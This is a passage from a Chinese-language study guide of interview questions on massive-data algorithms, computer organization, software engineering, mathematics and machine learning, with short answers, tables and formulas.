
  更具体的可看参考链接10

#### 25、有100亿个QQ号/URL，其中有重复的，要求去重（近年来一些公司考的很多）

判断某个元素是否存在用的是什么？HASH。在这道题目中，难以使用，占用空间无法忍受。

布隆过滤器

* 概率型数据结构（probabilistic data structure）

* 本质：位数组，数组的每个元素都只占用 1 bit ，并且每个元素只能是 0 或者 1。

* 思想：

  * ①使用K个哈希函数。$H_1,H_2,H_3,...H_k$
  * ②对每个数据x，使用K个哈希函数得到K个不同的特征$g_1=H_1(x),g_2=H_2(x)...g_k=H_k(x)$
  * ③将位数组的$bit[g_1]=bit[g_2]=...=bit[g_k]=1$
  * ④在第三步的时候，我们要看一下位数组的$g_1,g_2,...g_k$是否都为1，是的话说明可能重复了
  * ⑤重复步骤②③④

* 如果你比较细心，应该会注意到这个方法的缺陷，数据量一大，很有可能某个未出现过数据的特征依旧落在了bit数组里。比如给定三个哈希函数，我们输入`aaa`,得到1，2，3，输入`bbb`,得到4，5，6，后来我们输入了一个`ccc`,得到1，2，4，显然`ccc`没有出现在数组里，这就是布隆过滤器的缺陷。当然，我们可以采取更多一些的HASH函数来减少这个情况的发生。

* 有一个公式可以参考：
  $$
  k = \frac{m}{n}ln2
  $$
  k为哈希函数的个数，m为布隆过滤器长度，n为插入的元素个数。

#### 26、海量TOP1、海量TOPK、海量ONLY 1、海量unique、海量查找search、海量比较compare

* ①海量日志数据，提取出某日访问百度次数最多的那个IP —— TOP 1
  * 特点：IP地址为32位
  * 算法：分治+HASH
    * 设有文件$0.txt, 1.txt, 2.txt,...1023.txt$
    * 每个IP地址，进行ID=Hash(IP)%1024的运算存入相应的文件，即`ID.txt`
    * 对每个小文件统计频率最高的IP
    * 比较所有小文件里最高的IP频率，找最高的就好了
  * 条件：假设数据分布均匀，特殊情况下全是一个IP那就很麻烦了
* ②如何对 10 亿个词语进行排序,找出频率最高的 100 个 —— TOP K
  * 算法：分治+HASH
    * 设有文件$0.txt, 1.txt, 2.txt,...999.txt$
    * 每个IP地址，进行ID=Hash(word)%1000的运算存入相应的文件，即`ID.txt`
    * 对每个小文件统计每个词语的频率，取前100个存入文件WordFrequency_ID.txt
    * 对所有包含词频的文件再统计一遍
* ③10 亿个 32 位的数据，放到 4G 的空间里，怎么找出只出现一次的数据的个数 —— ONLY 1
  * 算法一：思考一下这个和TOP1是不是类似的？只不过取频率1次的。
  * 算法二：用长度为2^32 的bit数组做一下映射，空间为(`2^32/8/1024/1024=512MB`)
* ④给40亿个不重复的unsigned int的整数，没排过序的，然后再给一个数，如何快速判断这个数是否在那40亿个数当中——search
  * 算法一：用长度为2^32 的bit数组做一下映射，空间为(`2^32/8/1024/1024=512MB`)
  * 算法二：（仅是个思想，在这题并不实用）按照“位”分类比如高位为0的分一类A，高位为1的分一类B，次高位为0的分一类...
* ⑤ 给定a、b两个文件，各存放50亿个url，每个url各占64字节，内存限制是4G，让你找出a、b文件共同的url？
  * 算法一：（有错误率）对a文件建立布隆过滤器，对b文件的每个url询问是否可能出现在过滤器里面
  * 算法二：这个问题可以转化为之前提到的小文件方法。对a这个大文件，用hash分成1000个小文件，同样对b也这样操作，然后可能相同的url一定符合a_id=b_id，然后对每个小文件建map之类的数据结构，找出重复的就行。

#### 27、一个整型数组里除了一个数字之外，其他的数字都出现了两次。怎么找这个数？

> 思路比较新颖的题。刚开始看到我也不会做。

全部异或起来即可$a\oplus x_1 \oplus x_1\oplus x_2 \oplus x_2...\oplus x_n \oplus x_n=a$。

继续，如果有两个这样的数呢？我们还是和之前一样异或

$a\oplus b\oplus x_1 \oplus x_1\oplus x_2 \oplus x_2...\oplus x_n \oplus x_n=c$。

接下来我们关注c的二进制位，如果c的二进制位有一个是1，说明a和b相应的二进制位是不同的，我们可以按照这个二进制位对所有数字分成2类。分类完毕后对每一类再全部异或一次就好了（转换成上面的问题）。
$$
s_1=\{a,x_1,x_1,...x_k,x_k\}
\\
s_2=\{b,x_2,x_2,...x_m,x_m\}
$$




### 六、组成原理

#### 1、cisc 和 risc 的区别

|     对比项目     |                      CISC                       |                       RISC                       |
| :--------------: | :---------------------------------------------: | :----------------------------------------------: |
|       全称       | 复杂指令集（Complex Instruction Set Computing） | 精简指令集（Reduced Instruction Set Computing ） |
|     指令系统     |                   复杂，庞大                    |                    简单，精简                    |
|     指令数目     |                  一般大于200条                  |                  一般小于100条                   |
|     指令字长     |                     不固定                      |                       定长                       |
|    可访存指令    |                    不加限制                     |                只有Load/Store指令                |
| 各种指令执行时间 |                    相差较大                     |             绝大多数在一个周期内完成             |
| 各种指令使用频度 |                    相差很大                     |                    都比较常用                    |
|  通用寄存器数量  |                      较少                       |                        多                        |
|     目标代码     |        难以用优化编译生成高效的目标代码         |       采用优化的编译程序，生成代码较为高效       |
|     控制方式     |              绝大多数为微程序控制               |              绝大多数为组合逻辑控制              |
|     指令流水     |              可以通过一定方式实现               |                     必须实现                     |
|       实例       |                x86（16个寄存器）                |             MIPS（32个寄存器）、ARM              |

* x86寄存器
  32位CPU所含有的寄存器有：

  4个数据寄存器(EAX、EBX、ECX和EDX)

  2个变址和指针寄存器(ESI和EDI)

  2个指针寄存器(ESP和EBP)

  6个段寄存器(ES、CS、SS、DS、FS和GS)

  1个指令指针寄存器(EIP) 

  1个标志寄存器(EFlags)

* RISC 与 CISC 在争吵的过程中相互学习，现在的 RISC 指令集也达到数百条，运行周期也不再固定……虽然如此，RISC 设计的根本原则——针对流水线化的处理器优化－－没有改变。

#### 2、指令周期和机器周期

一条指令周期包括若干个机器周期，一条机器周期又包括若干个时钟周期，时钟周期即振荡周期。

* 时钟周期

  计算机中最基本的、最小的时间单位

* 指令周期

  取出并完成一条指令所需的时间，一般由若干个机器周期组成。

  一般来说，一个完整的指令周期应包括取指（取指令）、间址（取有效地址）、执行（取操作数）和中断（保存程序断点）

* 机器周期

  在计算机中，为了便于管理，常把一条指令的执行过程划分为若干个阶段，每一阶段完成一项工作。如取指令、存储器读、存储器写等。

#### 3、分支延时槽前途怎么样

> 应该是当时比较新的技术，书上没有提及

* 目的：

  为了提高流水线的效率。

* 流水线中，分支指令执行时因为确定下一条指令的目标地址（紧随其后 or 跳转目标处）一般要到第 2 级以后，在目标确定前流水线的取指级是不能工作的，即整个流水线就“浪费”（阻塞）了一个时间片，为了利用这个时间片，在体系结构的层面上规定跳转指令后面的一个时间片为分支延迟槽（branch delay slot）。位于分支延迟槽中的指令总是被执行，与分支发生与否没有关系。这样就有效利用了一个时间片，消除了流水线的一个“气泡”。这种技术手段主要用在早期没有分支预测的流水线 RISC 上，现代 RISC 实现早就可以在流水线的第 2 级利用分支预测确定跳转的目标，分支延迟槽也就失去了原来的价值，但为了软件上的兼容性 MIPS 和 SPARC 还是作了保留。

#### 4、P4里面有几级流水

> 同样也是一个古老的问题

P4即奔腾4

31级流水线。

#### 5、booth算法

可以用于补码一位乘法。 

它是一种带符号数的乘法，采用相加和相减的操作 ，计算补码数据的乘积

#### 7、CPU 的两种设计方法，优缺点？

* 组合逻辑设计法（又叫硬布线控制器）

  * 基本原理：

    根据指令的要求、当前的时序及外部和内部的状态情况，按时间的顺序发送一系列微操作控制信号。它由复杂的组合逻辑门电路和一些触发器构成。

  * 优点：

    是由于控制器的速度取决于电路延迟，所以速度快

  * 缺点：

    将控制部件看做专门产生固定时序控制信号的逻辑电路，所以把用最少元件和取得最高速度作为设计目标 ， 一旦设计完成，不可能通过其他额外修改添加新功能 。

* 微程序控制器

  * 基本原理：

    微程序控制器采用存储逻辑实现，也就是把微操作信号代码化，使每条机器指令转化成为一段微程序井存入一个专门的存储器（控制存储器）中，微操作控制信号由微指令产生。

  * 优点

    微程序控制器具有规整性、灵活性、可维护性等特点。

  * 缺点

    由于微程序控制器采用了存储程序原理，所以每条指令都要从控制存储器中取一次，影响了速度。

| 对比项目 |                         硬布线控制器                         |                         微程序控制器                         |
| :------: | :----------------------------------------------------------: | :----------------------------------------------------------: |
| 工作原理 | 微操作控制信号由组合逻辑电路根据当前的指令码、状态和时序，即时产生 | 微操作控制信号以微程序的形式存放在控制存储器中，执行指令时读出即可 |
| 执行速度 |                              快                              |                              慢                              |
|  规整性  |                         烦琐、不规整                         |                            较规整                            |
| 应用场合 |                           RISC CPU                           |                           CISC CPU                           |
| 易扩充性 |                      困难，要布线之类的                      |                          易扩充修改                          |



#### 8、体系结构/现在pc上用的是哪种体系结构（09年面试官提问）

In a register–memory approach one of the operands for ADD operation may be in memory, while the other is in a register. This differs from a load/store architecture (used by RISC designs such as MIPS) in which both operands for an ADD operation must be in registers before the ADD.

|      系统结构类型       | 最多操作数个数 | 内存地址个数 |    举例     |
| :---------------------: | :------------: | :----------: | :---------: |
|    register-register    |       3        |      0       |  ARM MIPS   |
| Register-memory（现代） |       2        |      1       | Intel 80x86 |

#### 9、cache（多年面试官提问）

* **什么是cache**

  高速缓冲存储器，容量小，速度快。CPU>cache>内存

  位于CPU与内存间。当CPU直接从内存中存取数据时要等待一定时间周期，而Cache则可以保存CPU刚用过或循环使用的一部分数据，如果CPU需要再次使用该部分数据时可从Cache中直接调用，这样就避免了重复存取数据，减少了CPU的等待时间，因而提高了系统的效率。Cache又分为L1Cache（一级缓存）和L2Cache（二级缓存），L1Cache主要是集成在CPU内部，而L2Cache集成在主板上或是CPU上。

* **cache中主存块替换算法**

  随机（RAND）算法、先进先出（ FIFO）算法、近期最少使用（LRU）算法和最不经常使用 （LFU）算法。

* **cache写策略**

  全写法和写回法都对应于 Cache 写命中（要被修改的单元在 Cache 中〉时的情况。 对于 Cache 写不命中，也有两种处理方法。 

  * 全写法（写直通法、 write through ) 

    * 当写cache命中时，cache与主存同时发生写修改，因而较好地维护了cache与主存的内容的一致性。
    * 优点：实现简单，能随时保持主存与cache的内容一致性。
    * 缺点：增加访存次数，降低 Cache 效率。
    * 改进：CPU和内存间增加一个写缓冲
    
  * 写回法 （write back) 
    
    当 CPU 对 Cache 写命中时，只修改 Cache 的内容，而不立即写入主存，只有当此块被换出时才写回主存。这种方法减少了访存次数，但存在不一致的隐患。采用这种策略时，每个 Cache行必须设置一个标志位（脏位），以反映此块是否被 CPU 修改过。
    
  * 写分配法（ write allocation）
    
    加载主存中的块到 Cache 中，然后更新这个 Cache 块。它试图利用程序的空间局部性，但是缺点是每次不命中都需要从主存中读取一块 。
    
    通常和写回法合用。
    
    ![image-20200314200333622](/Users/godspeed/Library/Application Support/typora-user-images/image-20200314200333622.png)
    
  * 写不分配法（write no allocation）
    
    在wiki中，有两种等价的写法，no-write-allocate，write-no-allocate
    
    只写入主存，不分配块到cache中。
    
    通常与全写法合用。
    
    ![image-20200314173315452](/Users/godspeed/Library/Application Support/typora-user-images/image-20200314173315452.png)
    
     
    
  * 现代计算机的 Cache 通常设立多级 Cache （通常为 3 级〉，假定设 3 级 Cache，按离 CPU 远近可各自命名 LI Cache、 L2 Cache、 L3 Cache，离 CPU 越远，访问速度越慢，容量越大。指令Cache 与数据 Cache 分离一般在 L1 级别，此时通常为写分配法与写回法合用。

* **cache和主存的映射方式**

  全相联映射、直接映射、组相联映射

* **Cache块大小对命中率的影响**

  随着块大小的增加，由于程序的空间局部性起主要作用，同一块中数据的利用率比较高。因此，Cache 的命中率开始升高。
  
  但如果块变得过大的话，会减少装入 Cache 的总块数，这种增加趋势在某一个“最佳块大小”处使 Cache 命中率达到最大值。在这一点以后，命中率随着块大小的增加反而减小。
  
  实际上，当块的容量变得比较大时，进入 Cache 中的许多数据可能根本用不上。

#### 10、什么是流水线？

* 定义：

  计算机的流水线是把一个重复的过程分解为若干子过程，每个子过程与其他子过程并行执行 ， 采用流水线技术只需增加少量硬件就能把计算机的运算速度提高几倍，成为计算机中普遍使用的一种并行处理技术。

* 影响流水线的因素

  * 结构相关（资源冲突），争用同一资源
    * 解决办法：
      * A指令访问时，B（若相关）暂停一个时钟周期
      * 重复配置资源，大家都有不用抢
  * 数据相关（数据冲突），指在一个程序中，存在必须等前一条指令执行完才能执行后一条指令的情况
    * 解决办法：
      * 暂停几个时钟周期，硬件阻塞（stall）或NOP（空指令）
      * 数据旁路，A指令算好之后B指令直接抢，不用等你写回寄存器
      * 指令编译优化
  * 控制相关（控制冲突），当流水线遇到转移指令和其他改变 PC 值的指令而造成断流时，会引起控制相关。
    * 对转移指令进行分支预测，尽早生成转移目标地址。分为静态预测和动态预测。静态预测总是预测条件不满足，即继续执行分支指令的后续指令。动态预测根据程序执行的历史情况，进行动态预测调整，有较高的预测准确率 。
    * 预取转移成功和不成功两个控制流方向上的目标指令 。
    * 加快和提前形成条件码。
    * 提高转移方向的猜准率。

* 流水线加速比

  完成同样一批任务，不使用流水线所用的时间与使用流水线所用的时间之比称为流水线的加速比。

* 流水线吞吐率

  吞吐率是指在单位时间内流水线所完成的任务数量。

  k为流水线的段数，n为任务个数
  $$
  TP=\frac{n}{(k+n-1)\Delta t}
  $$

#### 11、CPU结构

中央处理器

* 运算器
  * 算术逻辑单元、移位器、累加寄存器——和算（+|-|<<|and|or|not）直接有关系的
  * 通用寄存器、计数器（控制乘除运算的步数）——算的时候用到的
  * 暂存寄存器——暂存从内存读出来的数据
  * 程序状态字寄存器PSW——记录状态的
* 控制器
  * 程序计数器PC——下一条指令的地址
  * 指令寄存器IR——保存当前正在执行的指令
  * 指令译码器——对操作码字段译码
  * 存储器地址寄存器MAR——要访问的主存单元的地址
  * 存储器数据寄存器MDR——要写入主存or读出来的信息
  * 时序系统——产生各种时序信号
  * 微操作信号发生控制器——根据IR、PSW、时序信号产生控制信号

###  七、软件工程

> 文科。仅作简单整理。

#### 1、软件重用

软件重用是指在两次或多次不同的软件开发过程中重复使用相同或相似软件元素的过程。软件元素包括程序代码、测试用例、设计文档、设计过程、需要分析文档甚至领域知识。对于新的软件开发项目而言，它们或者是构成整个目标软件系统的部件，或者在软件开发过程中发挥某种作用。通常将这些软件元素称为软部件

#### 2、项目怎么分工

按照具体的情况具体分析，按照项目的团队的能力分工或者，按照项目的要求分别找人组成项目团队

#### 3、怎么做好一个项目

* 做好需求，确定客户的准确的需求
* 确定项目团队能够实现客户的需求，做好IT 项目的设计工作
* 在质量控制下，完成编码
* 经过一系列的测试
* 不断的与客户沟通，直到客户满意，交付使用

#### 4、什么是项目管理

项目管理是基于被接受的管理原则的一套技术方法，这些技术或方法用于计划、评估、控制工作活动，以按时、按预算、依据规范达到理想的最终效果，项目管理具有以下属性

* 一次性
* 独特性
* 目的性
* 确定性
* 活动的整体性
* 组织的临时性
* 开放性
* 成果的不可挽回性

#### 5、软件测试

* 软件测试定义是：为了发现程序中的错误而执行程序的过程软件测试主要工作内容是验证(verification)和确认(validation )

  * 验证(verification)

    是保证软件正确地实现了一些特定功能的一系列活动，即保证软件做了你所期望的事情

  * 确认(validation)

    是一系列的活动和过程，目的是想证实在一个给定的外部环境中软件的逻辑正确性。即保证软件以正确的方式来做了这个事件

#### 6、质量管理

在质量方面指挥和控制组织的协调的活动，通常包括制定质量方针和质量目标以及质量策划、质量控制、质量保证和质量改进

#### 7、软件开发模型

软件开发模型(Software  Development  Model)是指软件开发全部过程、活动和任务的结构框架。软件开发包括需求、设计、编码和测试等阶段，有时也包括维护阶段。

软件开发模型是指软件开发全部过程的结构框架，包括需求，设计，编码和测试等阶段，有时也包括维护阶段。典型的开发模型有，瀑布模型，快速原型模型，增量模型，螺旋模型等

* 瀑布模型：软件开发的各项活动按线性方式进行，只有在当前活动完成的情况下下一活动才能进行

  优点：有利于大型软件开发过程中人员的组织、管理，有利于软件开发方法和工具的研究，从而提高了大型软件项目开发的质量和效率。

  缺点：

  * 各个阶段的划分完全固定，阶段之间产生大量的文档，极大地增加了工作量； 
  * 由于开发模型是线性的，用户只有等到整个过程的末期才能见到开发成果，从而增加了开发的风险；

* 快速原型模型：第一步是建造一个快速原型，用户或客户对原型进行评价。开发人员可以确定客户的真正需求是什么；第二步则在第一步的基础上开发客户满意的软件产品

  优点：关注满足客户需求

  缺点：可能导致系统设计差、效率低，难于维护

* 增量模型：在各个阶段并不交付一个可运行的完整产品，而是交付满足客户需求的一个子集的可运行产品

  优点：客户可以不断地看到所开发的软件，从而降低开发风险，同时易于维护

  缺点：需要开放式体系结构。边做边修改模型，不容易控制整个工程

* 螺旋模型：它将瀑布模型和快速原型模型结合起来，强调了其他模型所忽视的风险分析，特别适合于大型复杂的系统

  优点：设计上的灵活性,可以在项目的各个阶段进行变更

  缺点：风险分析人员需要有经验且经过充分训练

#### 8、测试类型

单元测试，功能测试，集成测试，冒烟测试，回归测试，压力测试，性能测试， 黑盒测试，白盒测试

#### 9、软件开发有哪几个步骤

需求、设计、编码和测试等阶段

#### 10、项目经理应该做些什么

* 首要职责
  * 在预算范围内按时优质地领导项目小组完成全部项目工作内容，并使客户满意。为此项目经理必须在一系列的项目计划、组织和控制活动中做好领导工作，从而实现项目目标。
  * 从需求分析开始，设计、开发等一直参与，到最后的测试，以及软件的循环、开发

* 目的：达到软件的高性能，低花费

#### 11、软件工程需求分析怎么做，有啥难点

所谓"需求分析"，是指对要解决的问题进行详细的分析，弄清楚问题的要求，包括需要输入什么数据，要得到什么结果，最后应输出什么。“需求分析” 就是确定要计算机“做什么”。

难点：

* 用户与开发人员很难进行交流 

  在软件生存周期中，其它四个阶段都是面向软件技术问题，只有本阶段是面向用户的。需求分析是对用户的业务活动进行分析，明确在用户的业务环境中软件系统应该"做什么"。但是在开始时，开发人员和用户双方都不能准确地提出要"做什么？"。因为软件开发人员不是用户问题领域的专家，不熟悉用户的业务活动和业务环境，又不可能在短期内搞清楚；而用户不熟悉计算机应用的有关问题。由于双方互相不了解对方的工作，又缺乏共同语言，所以在交流时存在着隔阂。

* 用户的需求是动态变化的	

  对于一个大型而复杂的软件系统，用户很难精确完整地提出它的功能和性能要求。一开始只能提出一个大概、模糊的功能， 只有经过长时间的反复认识才逐步明确。有时进入到设计、编程阶段才能明确，更有甚者，到开发后期还在提新的要求。这无疑给软件开发带来困难。

* 系统变更的代价呈非线性增长	

  需求分析是软件开发的基础。假定在该阶段发现一个错误，解决它需要用一小时的时间，到设计、编程、测试和维护阶段解决，则要花2.5、5、25、100倍的时间。 因此，对于大型复杂系统而言，首先要进行可行性研究。开发人员对用户的要求及现实环境进行调查、了解，从技术、经济和社会因素三个方面进行研究并论证该软件项目的可行性，根据可行性研究的结果，决定项目的取舍

#### 12、UML 是什么/UML有哪些图

UML 是（Unified Modeling Language）统一建模语言

* UML 是一种为面向对象开发系统的产品进行说明、可视化、和编制文档的标准语言；
* UML 作为一种模型语言，它使开发人员专注于建立产品的模型和结构，而不是选用什么程序语言和算法实现；
* UML 是不同于其他常见的编程语言，如C + +，Java，它是一种绘画语言，用来做软件蓝图；
* UML 不是一种编程语言，但工具可用于生成各种语言的代码中使用UML图；
* UML 可以用来建模非软件系统的处理流程，以及像在一个制造单元等.



* 静态结构图Static Structure Diagram
  * 类图Class Diagram
  * 对象图Object Diagram
  * 用况图Use Case Diagram
* 交互图Interaction Diagram
  * 顺序图Sequence Diagram
  * 协作图Collaboration Diagram
  * 状态图State chart Diagrams
  * 活动图Activity Diagrams
* 实现图Implementation Diagrams
  * 构件图Component Diagram
  * 部署图Deployment Diagram

#### 13、软件测试及测试类型

软件测试是软件开发过程的重要组成部分，是用来确认一个程序的品质或性能是否符合开发之前所提出的一些要求

软件开发的整个流程中，有这样几种测试：（在实现的早期，软件各模块单个实现完毕后）进行单元测试（分两种，黑盒测试（即功能测试，测试其功能和接口，不用理会内部的实现）和白盒测试（即路径测试，测试内部设计结构）），（当各个模块结合时，进行）集成测试（自顶向下和自下向上两种），接下来是产品测试，最后是验收测试（根据测试的场所可以分为阿尔法测试（在开发场所的测试（用户也在现场））和贝塔测试（在用户处的测试））

黑盒测试就是将被测系统看成一个黑盒，从外界取得输入，然后再输出。要求测试者在测试时不能使用与被测系统内部结构相关的知识或经验。 黑盒测试的优点有： 1）比较简单，不需要了解程序内部的代码及实现；  2）与软件的内部实现无关； 3）从用户角度出发，能很容易的知道用户会用到哪些功能，会遇到哪些问题；  黑盒测试的缺点有：  1）不可能覆盖所有的代码，覆盖率较低，大概只能达到总代码量的30%；  2.白盒测试  白盒测试在测试时需要知道程序内部的设计结构及具体的代码实现，并以此为基础来设计测试用例

优点：帮助软件测试人员增大代码的覆盖率，发现代码中隐藏的问题

缺点：测试基于代码，只能测试开发人员做的对不对，而不能知道设计的正确与否，可能会漏掉一些功能需求；系统庞大时，测试开销会非常大



#### 14、软件工程流程

1、问题分析定义
对实际问题进行分析定义、以便更高效的解决该问题。
2、可行性研究
确定这个问题是否值得去解决，避免造成项目资源浪费。
3、需求分析
确定用户的需求，并分析如何用计算机来实现这些需求，确定的系统逻辑模型必须准确完整地体现用户的要求。
4、软件设计
提出解决问题的方法，有结构设计和逻辑设计。
5、编码实现
用特定的计算机语言实现前面的方法
6、测试
单元测试，集成测试
7、运行维护
通过各种必要的维护活动使系统持久地满足用户的需要。

#### 15、对软件工程的认识?

通过采用系统化，普适化（例如需求分析的任务集和整个软件开发过程中的通用步骤），可复用的工作流和模式（过程），提高软件质量和软件开发效率（最终目的）

#### 16、CMM(Capability Maturity Model)

即能力成熟度模型，是对于软件组织在定义、实施、度量、控制和改善其软件过程的实践中各个发展阶段的描述。

是把软件开发视为一个过程，并根据这一原则对软件开发和维护进行过程监控和研究，以使其更加科学化、标准化、使企业能够更好地实现商业目标。

CMM 是一种用于评价软件承包能力并帮助其改善软件质量的方法，侧重于软件开发过程的管理及工程能力的提高与评估。CMM 分为五个等级：一级为初始级， 二级为可重复级，三级为已定义级，四级为已管理级，五级为优化级

其所依据的想法是：只要集中精力持续努力去建立有效的软件工程过程的基础结构，不断进行管理的实践和过程的改进，就可以克服软件生产中的困难。CMM 它是目前国际上最流行、最实用的一种软件生产过程标准，已经得到了众多国家以及国际软件产业界的认可，成为当今企业从事规模软件生产不可缺少的一项内容

CMM 为软件企业的过程能力提供了一个阶梯式的改进框架，它基于过去所有软件工程过程改进的成果，吸取了以往软件工程的经验教训，提供了一个基于过程改进的框架；它指明了一个软件组织在软件开发方面需要管理哪些主要工作、这些工作之间的关系、以及以怎样的先后次序，一步一步的做好这些工作而使软件组织走向成熟

### 八、数学

> 如果你简历上写着这个的话/如果你说自己数学学的很好的话

#### 1.AX=B求解时的原理是什么？（18年面试官针对简历提问）

* 当A可逆时X=A逆 * B
* 当A不可逆时，对A、B形成的增广矩阵作初等行变换

#### 2.对傅立叶变换的理解/物理意义？

多个正余弦波叠加可以用来近似任何一个原始的周期函数

傅立叶变换将原来难以处理的时域信号转換成了易于分析的频域信号，可以利用一些工具对这些频域信号进行处理、加工。最后还可以利用傅立叶反变换将这些频域信号转换成时域信号

#### 3.快速傅立叶变换

* 应用：ACM中使用到的一个算法，用来加速多项式乘法。朴素高精度乘法时间O(n^2)，但FFT能O(nlog2n)的时间解决（自行了解，真的很难）

#### 4.伪素数

满足素数的某种性质(下面这个定理)，但并不一定是素数的数。最小的伪素数是341=31*11。

费马小定理
$$
如果p是一个质数，而整数a不是p的倍数，则有a^{p-1}≡1（mod p）
$$

#### 5.什么是大数定律，有什么用？

大数定理简单来说，指得是某个随机事件在单次试验中可能发生也可能不发生，但在大量重复实验中往往呈现出明显的规律性，即该随机事件发生的频率会向某个常数值收敛，该常数值即为该事件发生的概率。

看似随机的现象背后有统计规律。

#### 6.怎么降低矩阵乘法的复杂度？

> 有难度，但别无话不说

* 常数优化：

  遇到0元素，continue

* cache优化：ijk变成ikj（见智力题）

* strassen算法

  * 原理

    分治，将计算2个n阶矩阵乘积所需的时间改进到O（n^log7) ≈ O（n^2.81）

  * 前提条件

    两个n×n阶矩阵相乘，而且n必须为2的幂

    ![image-20200312172214869](/Users/godspeed/Library/Application Support/typora-user-images/image-20200312172214869.png)

  * 具体算法

    1.分块：由分块性质

    C11 = A11 • B11 + A12 • B21
     C12 = A11 • B12 + A12 • B22
     C21= A21 • B11 + A22 • B21
     C22 = A21 • B12 + A22 • B22

    按照这个算法，计算2个n阶矩阵的乘积转化为计算8个n/2阶矩阵的乘积和4个 n/2阶 矩阵的加法。 而 4个 n/2阶矩阵的加法可以在O（n^2）时间内完成，由此可知上述算法的时间耗费T（n）：

        T(n)=O(1) 当n=2
        T(n)=8T(n/2)+O(n^2) 当n>2
        
        解得T(n)=O(n^3)

    2.减少乘法次数

    步骤1并没有减少矩阵的乘法次数，要改进这个算法的时间，必须减少乘法的次数，Strassen就提出了 对于2阶矩阵的乘积方法，只用了7次乘法，用了多次加减，但是效率上升了很多。

    这七次乘法为

    M1 = A11( B12 - B22 )

    M2 = (A11 + A12)B22

    M3 = (A21 +A22)B11

    M4 = A22(B21 - B11)

    M5 = (A11 + A22)(B11 + B22)

    M6 = (A12 - A22)(B21 + B22)

    M7 = (A11 - A21)(B11 + B12)

    做完这七次乘法，通过一些加减就可以得到，最后矩阵的值：

    C11 = M5 + M4 - M2 + M6

    C12 = M1 + M2

    C21 = M3 + M4

    C22 = M5 + M1 - M3 - M7

    这样做以后，它的时间T（n）为： 


        T(n)=O(1) 当n=2
        T(n)=7T(n/2)+O(n^2) 当n>2
        
        解得T(n)=O(n^log7)≈O(n^2.81)

  * 如果我们同时考虑创建额外内存的开销，在n大于一定范围的时候，这个算法的实用性才会比较好

#### 7.矩阵相乘的几何意义？

矩阵A如果代表旋转变换，矩阵B如果代表伸缩变换

那么A*B代表先进行旋转，然后进行伸缩变换

[网址](https://www.geogebra.org/m/jxe3xtyp)

* 伸缩变换

  ![image-20200312195355949](/Users/godspeed/Library/Application Support/typora-user-images/image-20200312195355949.png)

* 再来看一个伸缩变换

  B从（1，0）变成（1，0）

  D从（0，1）变成（0，2）

  ![image-20200312195739414](/Users/godspeed/Library/Application Support/typora-user-images/image-20200312195739414.png)

* 来看一个旋转+伸缩变换

  B从（1，0）变成（1，-1）

  D从（0，1）变成（1，1）

  ![image-20200312201944033](/Users/godspeed/Library/Application Support/typora-user-images/image-20200312201944033.png)

#### 8.施密特正交化的几何意义

几何意义就是把一堆歪歪斜斜的基向量给掰直成标准正交基。

### 九、机器学习

#### 1.神经网络中会获得局部最优解，怎么解决？（19年面试官提问）

* 使用随机梯度下降（Stochastic Gradient Descent）SGD算法，每次迭代使用一个样本来对参数进行更新，即采用更小的步长和更多的迭代轮数。随机梯度下降最大的缺点在于每次更新可能并不会按照正确的方向进行，因此可以带来优化波动(扰动)。

  不过从另一个方面来看，随机梯度下降所带来的波动有个好处就是，对于类似盆地区域（即很多局部极小值点）那么这个波动的特点可能会使得优化的方向从当前的局部极小值点跳到另一个更好的局部极小值点，这样便可能对于非凸函数，最终收敛于一个较好的局部极值点，甚至全局极值点

  ![image-20200309225057035](/Users/godspeed/Library/Application Support/typora-user-images/image-20200309225057035.png)

  

#### 2.矩阵在机器学习中应用的缺点有哪些？

> 开放性问题，考验临场反应，下面给出个人看法

* 矩阵乘法需要时刻考虑维度匹配，比如`2*3`的矩阵和`3*4`的矩阵相乘
* 矩阵在计算时可能需要转置之类的操作，代码上不易阅读，需要较好的空间逻辑能力

#### 3.既然处理机器学习的问题的时候经常要把问题映射到更高维的空间，怎么又要进行降维？（18年面试官提问）

> 问的太深了.jpg

* 高维度

  缺点：

  * 高纬空间样本具有稀疏性，导致模型比较难找到数据特征

  * 过多的变量会妨碍模型查找规律

  * 特征矩阵过大， 计算量比较大，训练时间长

  * 维数灾难：curse of dimensionality，又名维度的诅咒

    在高维空间中，所有的数据都很稀疏，从很多角度看都不相似，因而平常使用的数据组织策略变得极其低效。

  优点：

  * 有些数据只用少量的特征很难对他们进行分类，在更高维的空间或许可以发掘他们的决策边界
  * 核方法（Kernel Trick）是解决非线性模式分析问题的一种有效途径，其核心思想是：首先，通过某种非线性映射将原始数据嵌入到合适的高维特征空间；然后，利用通用的线性学习器在这个新的空间中分析和处理模式。

* 对高维度进行降维

  原因：

  在原始的高维空间中，包含有冗余信息以及噪音信息，在实际应用例如图像识别中造成了误差，降低了准确率；而通过降维,我们希望减少 冗余信息 所造成的误差,提高识别（或其他应用）的精度。又或者希望通过降维算法来寻找数据内部的本质结构特征。

  应用场景：特征提取、对数据进行可视化、某些计算量比较大的场景可通过降维减小

  目的：

  * 减少特征属性的个数
  * 确保特征属性之间是相互独立的

  方法：

  * 主成分分析（Principal Components Analysis）PCA

    通过某种线性投影，将高维的数据映射到低维的空间中表示

  * 奇异值分解（Singular value decomposition）SVD

    * 对可相似对角化的矩阵
      $$
      A=P\Sigma P^{-1}
      $$
      
    * 若A是一般矩阵呢？
    
    我们有
  
  $$
      A=U\Sigma V^{T}
      \\
      A_{m*n},U_{m*m},\Sigma_{m*n},V_{n*n}
      且UU^{T}=E,V^{T}=E
  $$
  ​       我们来看看求解的过程如何
  $$
      Let  \ \ B= AA^T \ \ obviously,B=B^T
      \\
      Let \ \ C = A^TA \ \ obviously,C=C^T
      \\
      B、C一定可以相似对角化
      \\
      B=UDU^T =U\Sigma ^T\Sigma U^T =(U\Sigma ^T  V^T)(V\Sigma U^T )=AA^T
      \\
      C=VDV^T =V\Sigma ^T\Sigma V^T =(V\Sigma ^T  U^T)(U\Sigma V^T)=A^TA
  $$
  ​    应用：降噪、图片压缩

#### 4、上采样和下采样是什么意思？

- **上采样(Upsample)**

  输入图像通过卷积神经网络(CNN)提取特征后，输出的尺寸往往会变小，而有时我们需要将图像恢复到原来的尺寸以便进行进一步的计算(如图像的语义分割)，我们需要扩大图像尺寸，实现图像由小分辨率到大分辨率的映射的操作。

  * 方法

    * 双线性插值(bilinear)

    * 反卷积(Transposed Convolution)，也叫转置卷积

      * 反卷积是一种特殊的正向卷积，先按照一定的比例通过补 ![[公式]](https://www.zhihu.com/equation?tex=0) 来扩大输入图像的尺寸，接着旋转卷积核，再进行正向卷积。

    * 反池化(Unpooling)		

